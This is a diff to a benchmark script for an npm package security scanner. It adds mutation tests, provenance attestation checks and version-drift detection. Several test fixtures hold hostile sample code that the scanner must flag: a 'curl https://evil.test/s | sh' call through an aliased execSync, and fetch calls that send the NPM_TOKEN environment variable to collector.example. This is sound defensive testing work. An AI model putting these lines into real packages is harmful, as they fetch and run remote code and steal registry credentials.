@@ -4,10 +4,10 @@
  *
  * Implements NVIDIA Auto-Ontology's BENCHMARK.md rigor + REA `rea-analysis-optimization`
  * & `rea-ci-tests-audit` discipline:
- * - Executes a real 36-fixture security corpus (16 benign CLIs + 20 adversarial/fail-closed attacks)
+ * - Executes a real 45-fixture security corpus (19 benign CLIs + 26 adversarial/fail-closed attacks)
  *   measuring real Recall, False Positive Rate, p50/p95 latency, and Peak RSS memory.
  * - Executes a real Git history cold vs. warm Split-Plane SQLite cache benchmark.
- * - Executes 12 real perturbation/mutation checks proving assertions fail red on regressions.
+ * - Executes 16 real perturbation/mutation checks proving assertions fail red on regressions.
  * - Verifies `BENCHMARK.md` dataset digest freshness in `--check` mode.
  * - Reports Tier 3 Live Multi-Agent Sandbox Uplift honestly as NOT RUN (N/A) without fabrication.
  */
@@ -27,11 +27,13 @@ import {
 import { SplitPlaneCache } from "../src/cache/sqlite-store.ts";
 import { appendAuditEvent, verifyAuditLog } from "../src/compliance/audit-log.ts";
 import { DEFAULT_POLICY, loadNpmrc, routeRegistry } from "../src/config/policy.ts";
-import { validateOutboundUrl } from "../src/intel/registry-osv.ts";
-import { unpackTarballInMemory } from "../src/quarantine/safe-unpack.ts";
+import { validateOutboundUrl, verifyNpmAttestationPayload } from "../src/intel/registry-osv.ts";
+import { computeSha512Integrity, unpackTarballInMemory } from "../src/quarantine/safe-unpack.ts";
 import { ENGINE_VERSION } from "../src/types.ts";
+import { assembleInspectionReport } from "../src/verdict/engine-and-formatters.ts";
+import { triageUnpackedEntries } from "../src/analysis/static-triage.ts";
 import { buildBenchmarkCorpus, runInspectFixture } from "../tests/benchmark-corpus.ts";
-import { buildSyntheticTgz } from "../tests/helpers.ts";
+import { buildSyntheticTgz, buildTestNpmSlsaAttestation } from "../tests/helpers.ts";
 
 const ROOT = resolve(import.meta.dirname, "..");
 
@@ -296,6 +298,128 @@ async function runMutationChecks(): Promise<Array<{ id: string; passed: boolean;
       passed: pubHttpsOk === true && mappedMetaBlocked === false && mappedGitLoopBlocked === false,
       detail: `pub=${pubHttpsOk} -> meta=${mappedMetaBlocked}, gitLoop=${mappedGitLoopBlocked}`,
     });
+
+    // Mutation 13: Aliased ESM child_process import switching benign command -> curl-pipe-sh must flip clean -> malicious
+    const aliasClean = await runInspectFixture("mut-alias-cp", [
+      { name: "package/package.json", content: JSON.stringify({ name: "mut-alias-cp", version: "1.0.0", license: "MIT" }) },
+      { name: "package/index.js", content: 'import { execSync as run } from "node:child_process"; run("git --version");' },
+    ]);
+    const aliasEvil = await runInspectFixture("mut-alias-cp", [
+      { name: "package/package.json", content: JSON.stringify({ name: "mut-alias-cp", version: "1.0.0", license: "MIT" }) },
+      { name: "package/index.js", content: 'import { execSync as run } from "node:child_process"; run("curl https://evil.test/s | sh");' },
+    ]);
+    results.push({
+      id: "mut-13-aliased-esm-exec-caught",
+      passed: aliasClean === "VERIFIED_CLEAN_WITHIN_SCOPE" && aliasEvil === "MALICIOUS_INDICATORS_FOUND",
+      detail: `${aliasClean} -> ${aliasEvil}`,
+    });
+
+    // Mutation 14: Multi-hop helper wrapper & dynamic import(expr) must flip clean -> malicious/quarantined
+    const hopClean = await runInspectFixture("mut-hop", [
+      { name: "package/package.json", content: JSON.stringify({ name: "mut-hop", version: "1.0.0", license: "MIT" }) },
+      { name: "package/index.js", content: 'const l1 = (x) => fetch(x); const l2 = (y) => l1(y); l2("https://registry.npmjs.org/-/ping");' },
+    ]);
+    const hopEvil = await runInspectFixture("mut-hop", [
+      { name: "package/package.json", content: JSON.stringify({ name: "mut-hop", version: "1.0.0", license: "MIT" }) },
+      { name: "package/index.js", content: 'const l1 = (x) => fetch("https://collector.example/x", { body: x }); const l2 = (y) => l1(y); l2(globalThis.process.env.NPM_TOKEN);' },
+    ]);
+    results.push({
+      id: "mut-14-multihop-wrapper-global-env-caught",
+      passed: hopClean === "VERIFIED_CLEAN_WITHIN_SCOPE" && hopEvil === "MALICIOUS_INDICATORS_FOUND",
+      detail: `${hopClean} -> ${hopEvil}`,
+    });
+
+    // Mutation 15: Unverified/unanchored npm provenance MUST fail strict require_provenance; tampered SLSA digest MUST flip to MALICIOUS_INDICATORS_FOUND
+    const provTgz = buildSyntheticTgz([
+      { name: "package/package.json", content: JSON.stringify({ name: "mut-prov", version: "1.0.0", license: "MIT" }) },
+      { name: "package/index.js", content: "console.log('ok');" },
+    ]);
+    const provSha = computeSha512Integrity(provTgz);
+    const provUnpack = await unpackTarballInMemory(provTgz, DEFAULT_POLICY, provSha);
+    const provTriage = triageUnpackedEntries(provUnpack.entries, DEFAULT_POLICY);
+    const leafValidAtt = buildTestNpmSlsaAttestation({ packageName: "mut-prov", version: "1.0.0", tarballSha512Sri: provSha });
+    const leafTamperedAtt = buildTestNpmSlsaAttestation({ packageName: "mut-prov", version: "1.0.0", tarballSha512Sri: provSha, tamperDigest: true });
+    const leafInspOk = verifyNpmAttestationPayload(leafValidAtt, provSha, "mut-prov");
+    const leafInspBad = verifyNpmAttestationPayload(leafTamperedAtt, provSha, "mut-prov");
+    const strictLeafVerdict = assembleInspectionReport({
+      package_name: "mut-prov",
+      version: "1.0.0",
+      org_or_scope: "unscoped",
+      creator: "b",
+      category_tags: [],
+      summary: "ok",
+      license: "MIT",
+      bin_names: [],
+      unpack: provUnpack,
+      triage: provTriage,
+      parity: verifyTarballVsGitParity({ tarballManifest: provTriage.manifest, tarballEntries: provUnpack.entries, provenanceAttested: false, provenanceInspection: leafInspOk }),
+      advisories: [],
+      registryObservations: [],
+      registryUnknowns: [],
+      policy: { ...DEFAULT_POLICY, require_provenance: true },
+      host_capabilities: { node_version: process.version, git_available: true, git_partial_clone_supported: true, rea_cli_available: false, sqlite_available: true },
+      cwd: tmpdir(),
+    }).verdict;
+    const tamperedVerdict = assembleInspectionReport({
+      package_name: "mut-prov",
+      version: "1.0.0",
+      org_or_scope: "unscoped",
+      creator: "b",
+      category_tags: [],
+      summary: "ok",
+      license: "MIT",
+      bin_names: [],
+      unpack: provUnpack,
+      triage: provTriage,
+      parity: verifyTarballVsGitParity({ tarballManifest: provTriage.manifest, tarballEntries: provUnpack.entries, provenanceAttested: false, provenanceInspection: leafInspBad }),
+      advisories: [],
+      registryObservations: [],
+      registryUnknowns: [],
+      policy: DEFAULT_POLICY,
+      host_capabilities: { node_version: process.version, git_available: true, git_partial_clone_supported: true, rea_cli_available: false, sqlite_available: true },
+      cwd: tmpdir(),
+    }).verdict;
+    results.push({
+      id: "mut-15-provenance-epistemic-and-digest-tamper",
+      passed:
+        leafInspOk.status === "dsse_leaf_verified_unanchored" &&
+        leafInspOk.provenance_attested === false &&
+        strictLeafVerdict === "UNVERIFIABLE_UNKNOWN" &&
+        tamperedVerdict === "MALICIOUS_INDICATORS_FOUND",
+      detail: `strict_unanchored=${strictLeafVerdict} -> tampered=${tamperedVerdict}`,
+    });
+
+    // Mutation 16: Semicolon-free optional-chaining + indirect call & non-PURL/wrong-version provenance rejection
+    const asiClean = await runInspectFixture("mut-asi", [
+      { name: "package/package.json", content: JSON.stringify({ name: "mut-asi", version: "1.0.0", license: "MIT" }) },
+      { name: "package/index.js", content: 'const reserved = ["eval"]\nconst re = /^ok/\nconst m = re.exec(process.env.MY_MODE || "")\nconsole.log(reserved, m)' },
+    ]);
+    const asiEvil = await runInspectFixture("mut-asi", [
+      { name: "package/package.json", content: JSON.stringify({ name: "mut-asi", version: "1.0.0", license: "MIT" }) },
+      { name: "package/index.js", content: 'const tok = process?.env?.NPM_TOKEN\nfetch.call(globalThis, "https://collector.example/a", { body: tok })' },
+    ]);
+    const nonPurlAtt = buildTestNpmSlsaAttestation({
+      packageName: "mut-prov",
+      version: "1.0.0",
+      tarballSha512Sri: provSha,
+      overrideSubjectName: "not-a-purl",
+    });
+    const wrongVerAtt = buildTestNpmSlsaAttestation({
+      packageName: "mut-prov",
+      version: "9.9.9",
+      tarballSha512Sri: provSha,
+    });
+    const nonPurlStatus = verifyNpmAttestationPayload(nonPurlAtt, provSha, "mut-prov", undefined, "1.0.0").status;
+    const wrongVerStatus = verifyNpmAttestationPayload(wrongVerAtt, provSha, "mut-prov", undefined, "1.0.0").status;
+    results.push({
+      id: "mut-16-no-semi-opt-chain-and-prov-purl-strict",
+      passed:
+        asiClean === "VERIFIED_CLEAN_WITHIN_SCOPE" &&
+        asiEvil === "MALICIOUS_INDICATORS_FOUND" &&
+        nonPurlStatus === "verification_failed" &&
+        wrongVerStatus === "verification_failed",
+      detail: `asi=${asiClean}->${asiEvil}, nonPurl=${nonPurlStatus}, wrongVer=${wrongVerStatus}`,
+    });
   } finally {
     rmSync(dir, { recursive: true, force: true });
   }
@@ -339,6 +463,7 @@ async function main(): Promise<void> {
   const evalBytes = Buffer.concat([
     readFileSync(join(ROOT, "skill-src", "coldpin", "evals", "evals.json")),
     readFileSync(join(ROOT, "tests", "selection.jsonl")),
+    readFileSync(join(ROOT, "tests", "benchmark-corpus.ts")),
     readFileSync(join(ROOT, "rules", "triage-rules.json")),
   ]);
   const datasetDigest = createHash("sha256").update(evalBytes).digest("hex");
@@ -366,7 +491,7 @@ Tier 1 (static validation, hygiene, SkillSpector self-audit) and Tier 2 (${corpu
 - Evaluation date: \`${nowDate}\`
 - Host runtime: \`Node ${process.version}\` on \`${process.platform}/${process.arch}\`
 - Corpus: ${corpus.length} deterministic fixtures (${benignTotal} benign CLI archetypes + ${advTotal} adversarial/fail-closed attacks) + ${mutations.length} mutation checks + 10 trigger selection prompts (5 positive + 5 negative decoys)
-- Dataset digest: \`sha256:${datasetDigest}\` (\`evals/evals.json\` + \`tests/selection.jsonl\` + \`rules/triage-rules.json\`)
+- Dataset digest: \`sha256:${datasetDigest}\` (\`evals/evals.json\` + \`tests/selection.jsonl\` + \`tests/benchmark-corpus.ts\` + \`rules/triage-rules.json\`)
 - Peak process RSS observed: \`${peakRssMb} MiB\`
 - Tier 1 evidence: **Executed locally**
 - Tier 2 evidence: **Executed locally**
@@ -439,9 +564,13 @@ Regenerate this benchmark via \`npm run bench\` whenever \`src/\`, \`skill-src/\
   const dest = join(ROOT, "skill-src", "coldpin", "BENCHMARK.md");
   const checkOnly = process.argv.includes("--check");
   if (!checkOnly) {
-    writeFileSync(dest, benchmarkMd, "utf8");
+    writeFileSync(dest, benchmarkMd.replace(/\r\n/g, "\n"), "utf8");
   } else {
     const existing = readFileSync(dest, "utf8");
+    if (!existing.includes(`(\`v${ENGINE_VERSION}\`)`)) {
+      console.error(`BENCHMARK DRIFT: BENCHMARK.md version is stale (expected v${ENGINE_VERSION}); re-run 'npm run bench'.`);
+      process.exit(1);
+    }
     if (!existing.includes(`sha256:${datasetDigest}`)) {
       console.error(`BENCHMARK DRIFT: BENCHMARK.md dataset digest is stale (expected sha256:${datasetDigest}); re-run 'npm run bench'.`);
       process.exit(1);
